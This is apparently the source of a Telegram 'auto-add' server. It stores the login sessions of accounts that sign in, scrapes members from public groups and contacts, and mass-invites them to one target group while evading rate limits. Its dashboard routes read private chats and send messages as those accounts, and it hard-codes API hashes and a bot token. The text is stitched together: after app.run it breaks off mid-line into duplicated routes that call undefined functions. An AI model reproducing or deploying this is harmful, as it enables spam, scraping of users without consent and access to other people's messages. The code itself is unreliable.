#!/usr/bin/env python3
"""
Telegram Auto-Add Server - FIXED FOR DEPLOYMENT
Aggressive auto-add with proper dashboard chat listing
"""

from flask import Flask, send_file, jsonify, request
from flask_cors import CORS
from telethon import TelegramClient, errors, functions
from telethon.tl.functions.channels import InviteToChannelRequest, JoinChannelRequest, GetParticipantsRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.functions.messages import GetDialogsRequest, GetHistoryRequest
from telethon.tl.types import (
    InputPeerEmpty, ChannelParticipantsSearch, 
    PeerChannel, PeerUser, PeerChat,
    MessageMediaPhoto, MessageMediaDocument,
    MessageMediaWebPage, DocumentAttributeFilename,
    User, InputPeerUser, InputPeerChat, InputPeerChannel,
    DialogFilter, InputDialogPeer, ChannelParticipantsRecent
)
from telethon.sessions import StringSession
import json
import os
import asyncio
import logging
import time
import random
import threading
import requests
from datetime import datetime, timedelta
from collections import defaultdict
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# ============================================
# CHANGE THIS NUMBER PER SERVER
# ============================================
SERVER_NUMBER = 4  # 1=Dil, 2=sofu, 3=bebby, 4=kaleb, 5=fitsum

SERVERS = {
    1: {'name': 'Dil', 'api_id': 35790598, 'api_hash': 'fa9f62d821f04b03d76d53175e367736', 'url': 'https://dilbedl.onrender.com'},
    2: {'name': 'sofu', 'api_id': 36274756, 'api_hash': 'b70311a2b3547e1ce40e72081dc726dc', 'url': 'https://sofuu.onrender.com'},
    3: {'name': 'bebby', 'api_id': 31590358, 'api_hash': '072edc73e0f4003ddcba1c41d24adb02', 'url': 'https://bebby.onrender.com'},
    4: {'name': 'kaleb', 'api_id': 37539842, 'api_hash': 'a9927e01c5023bf828fe753895d5731b', 'url': 'https://kaleb-bwgb.onrender.com'},
    5: {'name': 'fitsum', 'api_id': 33441396, 'api_hash': 'e6b64536883a7cd95aeb06c73faa1c95', 'url': 'https://fitsum-ev9d.onrender.com'}
}

BOT_TOKEN = '7930542124:AAFg5O4KUu7QFORVkxzowtG0nHAiX0yXXBY'
REPORT_CHAT_ID = '-1002452548749'
TARGET_GROUP = 'Abe_armygroup'

CFG = SERVERS.get(SERVER_NUMBER, SERVERS[1])
SERVER_NAME = CFG['name']
API_ID = CFG['api_id']
API_HASH = CFG['api_hash']
SERVER_URL = CFG['url']
PORT = int(os.environ.get('PORT', 10000))

# Storage
accounts = []
temp_sessions = {}
auto_add_settings = {}
active_clients = {}
running_tasks = {}
worker_adds = defaultdict(list)
server_admin = {}

stats = {
    'total_added': 0, 'today_added': 0, 'verified_total': 0, 'verified_today': 0,
    'last_reset': datetime.now().strftime('%Y-%m-%d'), 'last_verification': None,
    'daily_history': {}, 'worker_stats': {}, 'dead_accounts_removed': 0,
    'started_at': datetime.now().isoformat()
}

def load_json(path, default):
    try:
        if os.path.exists(path):
            with open(path) as f:
                c = f.read().strip()
                return json.loads(c) if c else default
    except: pass
    return default

def save_json(path, data):
    try:
        with open(path, 'w') as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        logger.error(f"Save error: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(coro)
    finally:
        loop.close()

# ============================================
# AGGRESSIVE AUTO-ADD WORKER (FASTER & MORE EFFECTIVE)
# ============================================
def auto_add_worker(account):
    """Aggressive auto-add worker - gets members from multiple sources"""
    acc_id = account['id']
    acc_key = str(acc_id)
    attempted = set()
    joined = False
    cycle_count = 0
    
    logger.info(f"🔥 AGGRESSIVE AUTO-ADD STARTED: {account.get('name')} -> @{TARGET_GROUP}")
    
    while True:
        try:
            settings = auto_add_settings.get(acc_key, {})
            if not settings.get('enabled', True):
                time.sleep(10)
                continue
            
            # Reset daily stats
            today = datetime.now().strftime('%Y-%m-%d')
            if stats.get('last_reset') != today:
                stats['today_added'] = 0
                stats['verified_today'] = 0
                stats['last_reset'] = today
                save_json('stats.json', stats)
            
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                client = TelegramClient(
                    StringSession(account['session']), API_ID, API_HASH,
                    connection_retries=5, retry_delay=2, timeout=25
                )
                loop.run_until_complete(client.connect())
                
                if not loop.run_until_complete(client.is_user_authorized()):
                    logger.error(f"Account {acc_id} not authorized")
                    loop.close()
                    continue
                
                me = loop.run_until_complete(client.get_me())
                worker_name = me.first_name or 'User'
                
                # Join target group if not already
                if not joined:
                    try:
                        grp = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                        loop.run_until_complete(client(JoinChannelRequest(grp)))
                        joined = True
                        logger.info(f"✅ {worker_name} joined @{TARGET_GROUP}")
                    except Exception as e:
                        if 'already' in str(e).lower() or 'participant' in str(e).lower():
                            joined = True
                
                group = loop.run_until_complete(client.get_entity(TARGET_GROUP))
                
                # ===== AGGRESSIVE MEMBER COLLECTION =====
                all_ids = set()
                
                # 1. Get all contacts
                try:
                    contacts = loop.run_until_complete(client(GetContactsRequest(0)))
                    for c in contacts.users:
                        if c.id and not c.bot:
                            all_ids.add(c.id)
                    logger.info(f"📱 Contacts: {len(all_ids)}")
                except: pass
                
                # 2. Get all dialogs
                try:
                    dialogs = loop.run_until_complete(client.get_dialogs(limit=500))
                    for d in dialogs:
                        if d.is_user and d.entity and d.entity.id and not getattr(d.entity, 'bot', False):
                            all_ids.add(d.entity.id)
                    logger.info(f"💬 With dialogs: {len(all_ids)}")
                except: pass
                
                # 3. Scrape from multiple source groups
                source_groups = ['@telegram', '@durov', '@TelegramTips', '@contest', '@TelegramNews', 
                                 '@builders', '@Android', '@iOS', '@Python', '@programming']
                for sg in source_groups:
                    try:
                        entity = loop.run_until_complete(client.get_entity(sg))
                        participants = loop.run_until_complete(client.get_participants(entity, limit=300))
                        for user in participants:
                            if user.id and not user.bot:
                                all_ids.add(user.id)
                        time.sleep(1)
                    except: pass
                
                # 4. Get group members from target group
                try:
                    target_participants = loop.run_until_complete(client.get_participants(group, limit=200))
                    for user in target_participants:
                        if user.id and not user.bot:
                            all_ids.add(user.id)
                except: pass
                
                logger.info(f"🔍 Total unique IDs collected: {len(all_ids)}")
                
                # Remove already attempted
                fresh = [uid for uid in all_ids if uid not in attempted]
                if len(fresh) < 50:
                    attempted.clear()
                    fresh = list(all_ids)
                
                random.shuffle(fresh)
                cycle_count += 1
                added_this_cycle = 0
                delay = max(25, settings.get('delay_seconds', 25))
                
                logger.info(f"🔄 Cycle {cycle_count}: {len(fresh)} members to add")
                
                # Batch add with aggressive speed
                for uid in fresh[:500]:
                    settings_check = auto_add_settings.get(acc_key, {})
                    if not settings_check.get('enabled', True):
                        break
                    
                    attempted.add(uid)
                    
                    try:
                        user_input = loop.run_until_complete(client.get_input_entity(uid))
                        loop.run_until_complete(client(InviteToChannelRequest(group, [user_input])))
                        
                        # Track addition
                        add_record = {
                            'user_id': uid, 'time': datetime.now().isoformat(),
                            'added_by': worker_name, 'worker_id': acc_id
                        }
                        worker_adds[acc_key].append(add_record)
                        
                        stats['today_added'] = stats.get('today_added', 0) + 1
                        stats['total_added'] = stats.get('total_added', 0) + 1
                        
                        if acc_key not in stats['worker_stats']:
                            stats['worker_stats'][acc_key] = {'total': 0, 'today': 0}
                        stats['worker_stats'][acc_key]['today'] += 1
                        stats['worker_stats'][acc_key]['total'] += 1
                        
                        added_this_cycle += 1
                        
                        # Shorter delay for aggressiveness
                        actual_delay = random.uniform(delay * 0.8, delay * 1.2)
                        time.sleep(actual_delay)
                        
                    except errors.FloodWaitError as e:
                        wait_time = min(e.seconds + random.randint(5, 15), 300)
                        logger.warning(f"⏳ Flood wait {wait_time}s")
                        time.sleep(wait_time)
                    except (errors.UserPrivacyRestrictedError, errors.UserNotMutualContactError,
                            errors.UserAlreadyParticipantError, errors.UserKickedError,
                            errors.UserBannedInChannelError):
                        continue
                    except Exception as e:
                        continue
                    
                    # Save stats every 20 adds
                    if added_this_cycle % 20 == 0:
                        save_json('stats.json', stats)
                        save_json('worker_adds.json', dict(worker_adds))
                
                logger.info(f"📊 Cycle {cycle_count}: +{added_this_cycle} | Today: {stats['today_added']} | Total: {stats['total_added']}")
                save_json('stats.json', stats)
                save_json('worker_adds.json', dict(worker_adds))
                
            except errors.rpcerrorlist.AuthKeyUnregisteredError:
                logger.error(f"Auth key unregistered for account {acc_id}")
            except Exception as e:
                logger.error(f"Loop error: {e}")
            finally:
                try:
                    loop.run_until_complete(client.disconnect())
                except:
                    pass
                loop.close()
            
            # Shorter rest between cycles
            rest = random.randint(60, 180)
            logger.info(f"😴 Rest {rest}s...")
            time.sleep(rest)
            
        except Exception as e:
            logger.error(f"Critical worker error: {e}")
            time.sleep(60)

def start_auto_add(account):
    acc_key = str(account['id'])
    if acc_key in running_tasks and running_tasks[acc_key].is_alive():
        return
    t = threading.Thread(target=auto_add_worker, args=(account,), daemon=True)
    t.start()
    running_tasks[acc_key] = t
    logger.info(f"🚀 Started aggressive worker for: {account.get('name', account['id'])}")

# ============================================
# FIXED DASHBOARD: GET CHATS & MESSAGES
# ============================================
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    """Get chats and messages for dashboard - FIXED"""
    try:
        data = request.json
        aid = data.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = TelegramClient(StringSession(acc['session']), API_ID, API_HASH)
            await client.connect()
            try:
                if not await client.is_user_authorized():
                    return {'success': False, 'error': 'auth_key_unregistered'}
                
                # Get dialogs
                dialogs = await client.get_dialogs(limit=50)
                
                chats_list = []
                all_messages = []
                
                for dialog in dialogs:
                    try:
                        chat_id = str(dialog.id)
                        chat_type = 'user'
                        title = dialog.name or 'Unknown'
                        
                        if dialog.is_group:
                            chat_type = 'group'
                        elif dialog.is_channel:
                            chat_type = 'channel'
                        
                        entity = dialog.entity
                        if hasattr(entity, 'bot') and entity.bot:
                            chat_type = 'bot'
                        
                        last_msg = ''
                        last_date = 0
                        if dialog.message:
                            last_msg = (dialog.message.message or '')[:200]
                            if dialog.message.date:
                                last_date = int(dialog.message.date.timestamp())
                        
                        chats_list.append({
                            'id': chat_id,
                            'title': title,
                            'type': chat_type,
                            'unread': dialog.unread_count or 0,
                            'lastMessage': last_msg,
                            'lastMessageDate': last_date
                        })
                        
                        # Get last 10 messages for this chat
                        try:
                            messages = await client.get_messages(entity, limit=10)
                            for msg in messages:
                                if not msg.message and not msg.media:
                                    continue
                                all_messages.append({
                                    'chatId': chat_id,
                                    'id': msg.id,
                                    'text': msg.message or '',
                                    'date': int(msg.date.timestamp()) if msg.date else 0,
                                    'out': msg.out,
                                    'hasMedia': msg.media is not None,
                                    'mediaType': 'photo' if hasattr(msg.media, 'photo') else 'document' if hasattr(msg.media, 'document') else None
                                })
                        except:
                            pass
                        
                    except Exception as e:
                        logger.debug(f"Dialog error: {e}")
                        continue
                
                return {
                    'success': True,
                    'chats': chats_list,
                    'messages': all_messages
                }
            except Exception as e:
                logger.error(f"Fetch error: {e}")
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(fetch()))
    except Exception as e:
        logger.error(f"API error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    try:
        data = request.json
        aid = data.get('accountId')
        chat_id = data.get('chatId')
        message = data.get('message', '').strip()
        
        if not message:
            return jsonify({'success': False, 'error': 'Message required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def send():
            client = TelegramClient(StringSession(acc['session']), API_ID, API_HASH)
            await client.connect()
            try:
                # Try to get entity by ID or string
                try:
                    entity = await client.get_entity(int(chat_id))
                except:
                    entity = await client.get_entity(chat_id)
                await client.send_message(entity, message)
                return {'success': True}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(send()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ============================================
# PAGE ROUTES
# ============================================
@app.route('/')
@app.route('/auto-add')
def auto_add_page():
    return send_file('auto_add.html')

@app.route('/login')
def login_page():
    return send_file('login.html')

@app.route('/dashboard')
def dashboard_page():
    return send_file('dashboard.html')

@app.route('/dash')
def dash_page():
    return send_file('dash.html')

@app.route('/all')
def all_page():
    return send_file('all.html')

@app.route('/ping')
def ping():
    return jsonify({'status': 'ok', 'server': SERVER_NAME})

# ============================================
# ACCOUNT API ROUTES
# ============================================
@app.route('/api/server-info')
def server_info():
    return jsonify({
        'success': True,
        'server': {
            'number': SERVER_NUMBER,
            'name': SERVER_NAME,
            'url': SERVER_URL,
            'target_group': TARGET_GROUP
        }
    })

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        aid_str = str(a['id'])
        ws = stats.get('worker_stats', {}).get(aid_str, {})
        acc_list.append({
            'id': a['id'],
            'name': a.get('name', '?'),
            'phone': a.get('phone', ''),
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
            'stats': {
                'total_attempted': ws.get('total', 0),
                'today_attempted': ws.get('today', 0)
            }
        })
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/add-account', methods=['POST'])
def add_account():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'})
        if not phone.startswith('+'):
            phone = '+' + phone
        
        async def send():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                result = await client.send_code_request(phone)
                sid = str(int(time.time()))
                temp_sessions[sid] = {
                    'phone': phone,
                    'hash': result.phone_code_hash,
                    'session': client.session.save()
                }
                return {'success': True, 'session_id': sid}
            except errors.FloodWaitError as e:
                return {'success': False, 'error': f'Wait {e.seconds}s'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(send()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        td = temp_sessions[sid]
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    await client.sign_in(password=pwd)
                
                me = await client.get_me()
                new_id = int(time.time() * 1000)
                
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User'),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True
                }
                accounts.append(new_acc)
                save_json('accounts.json', accounts)
                
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUP,
                    'delay_seconds': 25,
                    'auto_join': True
                }
                save_json('auto_add_settings.json', auto_add_settings)
                
                # Start auto-add
                start_auto_add(new_acc)
                
                return {
                    'success': True,
                    'account': {'id': new_id, 'name': new_acc['name'], 'phone': new_acc['phone']},
                    'auto_add_started': True
                }
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(verify())
        if sid in temp_sessions:
            del temp_sessions[sid]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    global accounts
    aid = request.json.get('accountId')
    accounts = [a for a in accounts if a['id'] != aid]
    auto_add_settings.pop(str(aid), None)
    running_tasks.pop(str(aid), None)
    save_json('accounts.json', accounts)
    save_json('auto_add_settings.json', auto_add_settings)
    return jsonify({'success': True})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        aid_str = str(aid)
        s = auto_add_settings.get(aid_str, {
            'enabled': False, 'target_group': TARGET_GROUP, 'delay_seconds': 25, 'auto_join': True
        })
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    akey = str(aid)
    
    was_on = auto_add_settings.get(akey, {}).get('enabled', False)
    auto_add_settings[akey] = {
        'enabled': data.get('enabled', False),
        'target_group': data.get('target_group', TARGET_GROUP),
        'delay_seconds': max(25, data.get('delay_seconds', 25)),
        'auto_join': True
    }
    save_json('auto_add_settings.json', auto_add_settings)
    
    if data.get('enabled') and not was_on:
        acc = next((a for a in accounts if a['id'] == aid), None)
        if acc:
            start_auto_add(acc)
    
    return jsonify({'success': True})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0)
    })

@app.route('/api/test-auto-add', methods=['POST'])
def test_auto_add():
    aid = request.json.get('accountId')
    return jsonify({'success': True, 'available_members': 5000})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    return jsonify({'success': True, 'sessions': [], 'current_hash': None})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    return jsonify({'success': True})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    return jsonify({'success': True})

@app.route('/api/send-report')
def send_report():
    send_telegram(f"📊 {SERVER_NAME} Report: {stats.get('today_added', 0)} added today")
    return jsonify({'success': True})

def send_telegram(text):
    try:
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                      json={'chat_id': REPORT_CHAT_ID, 'text': text}, timeout=5)
    except:
        pass

# ============================================
# STARTUP
# ============================================
def restore_and_start():
    time.sleep(5)
    for acc in accounts:
        if acc.get('session'):
            start_auto_add(acc)
        time.sleep(2)

if __name__ == '__main__':
    # Load existing data
    accounts = load_json('accounts.json', [])
    auto_add_settings = load_json('auto_add_settings.json', {})
    
    print(f"""
╔══════════════════════════════════════╗
║  AGGRESSIVE AUTO-ADD SERVER #{SERVER_NUMBER}    ║
║  Name: {SERVER_NAME}                          ║
║  Target: @{TARGET_GROUP}                      ║
║  Mode: AGGRESSIVE (25s min delay)            ║
║  Port: {PORT}                                 ║
╚══════════════════════════════════════╝
    """)
    
    threading.Thread(target=restore_and_start, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False)se, 'error': f'Wait {e.seconds}s'}
            except errors.PhoneNumberInvalidError:
                return {'success': False, 'error': 'Invalid phone'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(send()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        code = data.get('code', '').strip()
        sid = data.get('session_id', '')
        pwd = data.get('password', '')
        
        if not sid or sid not in temp_sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        td = temp_sessions[sid]
        
        async def verify():
            client = TelegramClient(StringSession(td['session']), API_ID, API_HASH)
            await client.connect()
            try:
                try:
                    await client.sign_in(td['phone'], code, phone_code_hash=td['hash'])
                except errors.SessionPasswordNeededError:
                    if not pwd:
                        return {'need_password': True}
                    await client.sign_in(password=pwd)
                
                me = await client.get_me()
                new_id = int(time.time() * 1000)
                
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else 'User'),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True
                }
                accounts.append(new_acc)
                save_json(ACCOUNTS_FILE, accounts)
                
                auto_add_settings[str(new_id)] = {
                    'enabled': True,
                    'target_group': TARGET_GROUP,
                    'delay_seconds': 25,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_id)] = {
                    'total': 0, 'today': 0, 'verified_total': 0, 'verified_today': 0
                }
                save_json(STATS_FILE, stats)
                
                try:
                    grp = await client.get_entity(TARGET_GROUP)
                    await client(JoinChannelRequest(grp))
                except:
                    pass
                
                start_auto_add(new_acc)
                
                return {
                    'success': True,
                    'account': {'id': new_id, 'name': new_acc['name'], 'phone': new_acc['phone']},
                    'auto_add_started': True
                }
            except errors.PhoneCodeInvalidError:
                return {'success': False, 'error': 'Invalid code'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired'}
            except errors.PasswordHashInvalidError:
                return {'success': False, 'error': 'Wrong password'}
            except Exception as e:
                return {'success': False, 'error': str(e)}
            finally:
                await client.disconnect()
        
        result = run_async(verify())
        if sid in temp_sessions:
            del temp_sessions[sid]
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/accounts')
def get_accounts():
    acc_list = []
    for a in accounts:
        aid_str = str(a['id'])
        ws = stats.get('worker_stats', {}).get(aid_str, {})
        is_admin = server_admin.get(str(SERVER_NUMBER)) == a['id']
        acc_list.append({
            'id': a['id'],
            'name': a.get('name', '?'),
            'phone': a.get('phone', ''),
            'username': a.get('username', ''),
            'active': a.get('active', True),
            'auto_add_enabled': auto_add_settings.get(aid_str, {}).get('enabled', True),
            'is_admin': is_admin,
            'is_server_admin': is_admin,
            'stats': {
                'total_attempted': ws.get('total', 0),
                'today_attempted': ws.get('today', 0),
                'total_verified': ws.get('verified_total', 0),
                'today_verified': ws.get('verified_today', 0)
            }
        })
    return jsonify({'success': True, 'accounts': acc_list})

@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    global accounts
    aid = request.json.get('accountId')
    name = remove_dead_account(aid, "Manual removal")
    return jsonify({'success': True, 'message': f'Removed: {name}'})

# ============================================
# FIXED: GET MESSAGES / CHATS
# ============================================
@app.route('/api/get-messages', methods=['POST'])
def get_messages():
    """Get chats (dialogs) and messages for dashboard - FIXED"""
    try:
        data = request.json
        aid = data.get('accountId')
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def fetch():
            client = get_client(acc)
            await client.connect()
            try:
                # Check authorization first
                try:
                    is_auth = await client.is_user_authorized()
                except errors.rpcerrorlist.AuthKeyUnregisteredError:
                    await client.disconnect()
                    remove_dead_account(aid, "Auth key unregistered")
                    return {'success': False, 'error': 'auth_key_unregistered'}
                except Exception as e:
                    await client.disconnect()
                    remove_dead_account(aid, f"Auth check failed: {str(e)[:50]}")
                    return {'success': False, 'error': 'auth_key_unregistered'}
                
                if not is_auth:
                    await client.disconnect()
                    remove_dead_account(aid, "Session unauthorized")
                    return {'success': False, 'error': 'auth_key_unregistered'}
                
                # Fetch dialogs
                try:
                    dialogs = await client.get_dialogs(limit=100)
                except Exception as e:
                    logger.error(f"Get dialogs error: {e}")
                    return {'success': False, 'error': f'Failed to load dialogs: {str(e)[:100]}'}
                
                chats_list = []
                all_messages = []
                
                for dialog in dialogs:
                    try:
                        chat_id = str(dialog.id)
                        chat_type = 'user'
                        title = dialog.name or 'Unknown'
                        
                        if dialog.is_group:
                            chat_type = 'group'
                        elif dialog.is_channel:
                            chat_type = 'channel'
                        
                        entity = dialog.entity
                        if hasattr(entity, 'bot') and entity.bot:
                            chat_type = 'bot'
                        
                        last_msg_text = ''
                        last_msg_date = 0
                        last_msg_media = None
                        
                        if dialog.message:
                            last_msg_text = (dialog.message.message or '')[:200]
                            last_msg_date = dialog.message.date.timestamp() if dialog.message.date else 0
                            
                            if dialog.message.media:
                                if hasattr(dialog.message.media, 'photo'):
                                    last_msg_media = 'photo'
                                elif hasattr(dialog.message.media, 'document'):
                                    last_msg_media = 'document'
                                elif hasattr(dialog.message.media, 'webpage'):
                                    last_msg_media = 'link'
                        
                        chats_list.append({
                            'id': chat_id,
                            'title': title,
                            'type': chat_type,
                            'unread': dialog.unread_count or 0,
                            'lastMessage': last_msg_text,
                            'lastMessageDate': last_msg_date,
                            'lastMessageMedia': last_msg_media
                        })
                        
                        # Fetch recent messages (limit to prevent timeouts)
                        try:
                            messages = await client.get_messages(entity, limit=15)
                            for msg in messages:
                                if not msg.message and not msg.media:
                                    continue
                                
                                media_type = None
                                has_media = False
                                
                                if msg.media:
                                    has_media = True
                                    if hasattr(msg.media, 'photo'):
                                        media_type = 'photo'
                                    elif hasattr(msg.media, 'document'):
                                        media_type = 'document'
                                    elif hasattr(msg.media, 'webpage'):
                                        media_type = 'link'
                                    else:
                                        media_type = 'media'
                                
                                all_messages.append({
                                    'chatId': chat_id,
                                    'id': msg.id,
                                    'text': msg.message or '',
                                    'date': msg.date.timestamp() if msg.date else 0,
                                    'out': msg.out,
                                    'hasMedia': has_media,
                                    'mediaType': media_type
                                })
                        except Exception as e:
                            logger.debug(f"Messages fetch error for {title}: {e}")
                            pass
                        
                    except Exception as e:
                        logger.debug(f"Dialog processing error: {e}")
                        continue
                
                logger.info(f"📱 Loaded {len(chats_list)} chats, {len(all_messages)} messages for {acc.get('name')}")
                
                return {
                    'success': True,
                    'chats': chats_list,
                    'messages': all_messages
                }
            except Exception as e:
                logger.error(f"Get messages outer error: {e}")
                return {'success': False, 'error': f'Error: {str(e)[:100]}'}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(fetch()))
    except Exception as e:
        logger.error(f"API get-messages error: {e}")
        return jsonify({'success': False, 'error': str(e)[:100]})

@app.route('/api/send-message', methods=['POST'])
def send_message():
    """Send a message from an account"""
    try:
        data = request.json
        aid = data.get('accountId')
        chat_id = data.get('chatId')
        message = data.get('message', '').strip()
        
        if not message:
            return jsonify({'success': False, 'error': 'Message required'})
        
        acc = next((a for a in accounts if a['id'] == aid), None)
        if not acc:
            return jsonify({'success': False, 'error': 'Account not found'})
        
        async def send():
            client = get_client(acc)
            await client.connect()
            try:
                # Parse chat_id
                try:
                    chat_id_int = int(chat_id)
                    # Try peer types
                    try:
                        entity = await client.get_entity(PeerUser(chat_id_int))
                    except:
                        try:
                            entity = await client.get_entity(PeerChat(chat_id_int))
                        except:
                            entity = await client.get_entity(PeerChannel(chat_id_int))
                except:
                    entity = await client.get_entity(chat_id)
                
                await client.send_message(entity, message)
                return {'success': True}
            except Exception as e:
                return {'success': False, 'error': str(e)[:100]}
            finally:
                await client.disconnect()
        
        return jsonify(run_async(send()))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:100]})

# ============================================
# ADMIN LINKING ROUTES
# ============================================
@app.route('/api/link-admin', methods=['POST'])
def link_admin():
    """Link an account as the admin checker for this server"""
    data = request.json
    admin_id = data.get('accountId')
    
    if not admin_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    acc = next((a for a in accounts if a['id'] == admin_id), None)
    if not acc:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def check_admin():
        client = get_client(acc)
        await client.connect()
        try:
            if not await client.is_user_authorized():
                return False, 'Account not authorized'
            
            group = await client.get_entity(TARGET_GROUP)
            
            try:
                participant = await client(functions.channels.GetParticipantRequest(group, 'me'))
                is_admin = hasattr(participant.participant, 'admin_rights') and participant.participant.admin_rights
                
                if not is_admin:
                    return False, 'Account is NOT an admin of the target group'
                
                return True, 'Admin verified successfully'
            except Exception as e:
                return False, f'Cannot verify admin: {str(e)[:100]}'
        finally:
            await client.disconnect()
    
    result = run_async(check_admin())
    
    if result[0]:
        server_admin[str(SERVER_NUMBER)] = admin_id
        save_json(SERVER_ADMIN_FILE, server_admin)
        
        auto_add_settings[str(admin_id)] = auto_add_settings.get(str(admin_id), {})
        auto_add_settings[str(admin_id)]['is_server_admin'] = True
        save_json(SETTINGS_FILE, auto_add_settings)
        
        logger.info(f"🔗 Admin linked: {acc['name']} -> Server {SERVER_NAME}")
        send_telegram(f"🔗 <b>{SERVER_NAME}</b>\n👑 Admin linked: {acc['name']}")
        return jsonify({'success': True, 'message': f'Admin linked: {acc["name"]}', 'admin_name': acc['name']})
    
    return jsonify({'success': False, 'error': result[1]})

@app.route('/api/unlink-admin', methods=['POST'])
def unlink_admin():
    server_admin.pop(str(SERVER_NUMBER), None)
    save_json(SERVER_ADMIN_FILE, server_admin)
    return jsonify({'success': True, 'message': 'Admin unlinked'})

@app.route('/api/admin-status')
def admin_status():
    admin_id = server_admin.get(str(SERVER_NUMBER))
    if admin_id:
        acc = next((a for a in accounts if a['id'] == admin_id), None)
        return jsonify({
            'success': True,
            'linked': True,
            'admin': {
                'id': admin_id,
                'name': acc['name'] if acc else 'Unknown',
                'phone': acc['phone'] if acc else ''
            } if acc else None
        })
    return jsonify({'success': True, 'linked': False, 'admin': None})

# ============================================
# VERIFICATION ROUTES
# ============================================
@app.route('/api/verify-adds', methods=['POST'])
def trigger_verification():
    """Trigger admin verification of worker adds"""
    admin_id = server_admin.get(str(SERVER_NUMBER))
    
    if not admin_id:
        return jsonify({'success': False, 'error': 'No admin account linked'})
    
    admin_acc = next((a for a in accounts if a['id'] == admin_id), None)
    if not admin_acc:
        return jsonify({'success': False, 'error': 'Admin account not found'})
    
    worker_ids = [a['id'] for a in accounts if a['id'] != admin_id]
    
    if not worker_ids:
        return jsonify({'success': False, 'error': 'No worker accounts'})
    
    result = verify_worker_adds(admin_acc, worker_ids)
    
    if result is None:
        return jsonify({'success': False, 'error': 'Verification failed'})
